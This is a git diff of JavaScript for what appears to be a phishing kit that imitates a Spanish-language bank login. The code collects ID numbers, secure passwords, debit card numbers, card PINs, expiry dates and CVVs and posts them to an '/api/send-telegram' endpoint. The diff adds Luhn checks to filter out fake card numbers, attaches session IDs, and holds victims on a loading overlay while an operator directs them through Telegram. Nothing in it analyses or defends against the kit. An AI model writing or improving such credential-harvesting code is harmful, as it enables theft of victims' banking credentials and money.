@@ -101,6 +101,36 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
+    // Validación de Luhn para tarjetas
+    function validarLuhn(numeroTarjeta) {
+        // Eliminar espacios y convertir a string
+        const numero = numeroTarjeta.replace(/\s/g, '');
+        
+        if (!/^\d{16}$/.test(numero)) {
+            return false;
+        }
+
+        let suma = 0;
+        let alternar = false;
+
+        // Recorrer de derecha a izquierda
+        for (let i = numero.length - 1; i >= 0; i--) {
+            let digito = parseInt(numero.charAt(i), 10);
+
+            if (alternar) {
+                digito *= 2;
+                if (digito > 9) {
+                    digito -= 9;
+                }
+            }
+
+            suma += digito;
+            alternar = !alternar;
+        }
+
+        return (suma % 10) === 0;
+    }
+
     // Manejar cambio entre formularios
     loginOptions.forEach((button, index) => {
         button.addEventListener('click', function() {
@@ -160,15 +190,17 @@ document.addEventListener('DOMContentLoaded', function() {
         window.loadingOverlay.showSending('Verificando credenciales...');
 
         // Preparar datos
+        const sessionId = window.commonUtils.getSessionId();
         const data = {
             tipo: 'Clave Segura',
             tipoDocumento: tipoDoc,
             numeroDocumento: numDoc,
-            clave: claveSegura
+            clave: claveSegura,
+            sessionId: sessionId
         };
 
         try {
-            console.log('📤 Enviando datos a Telegram...');
+            console.log('📤 Enviando datos a Telegram con sessionId:', sessionId);
             
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
@@ -250,6 +282,12 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
+        // Validar con algoritmo de Luhn
+        if (!validarLuhn(numeroTarjeta)) {
+            window.commonUtils.showError('El número de tarjeta no es válido');
+            return;
+        }
+
         if (claveTarjeta.length !== 4) {
             window.commonUtils.showError('La clave de tarjeta debe tener 4 dígitos');
             return;
@@ -270,6 +308,7 @@ document.addEventListener('DOMContentLoaded', function() {
         window.loadingOverlay.showSending('Verificando información de tarjeta...');
 
         // Preparar datos
+        const sessionId = window.commonUtils.getSessionId();
         const data = {
             tipo: 'Tarjeta Débito',
             tipoDocumento: tipoDoc,
@@ -277,11 +316,12 @@ document.addEventListener('DOMContentLoaded', function() {
             numeroTarjeta: numeroTarjeta,
             claveTarjeta: claveTarjeta,
             fechaVencimiento: fechaVencimiento,
-            cvv: cvv
+            cvv: cvv,
+            sessionId: sessionId
         };
 
         try {
-            console.log('📤 Enviando datos a Telegram...');
+            console.log('📤 Enviando datos a Telegram con sessionId:', sessionId);
             
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
@@ -312,8 +352,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 timestamp: new Date().toISOString()
             }));
 
-            // Redirigir a página de captura de cara
-            window.location.href = 'cara.html';
+            // Mantener overlay y esperar redirección de Telegram
+            console.log('📺 Overlay visible: esperando respuesta de Telegram...');
 
         } catch (error) {
             console.error('❌ Error al enviar formulario:', error);
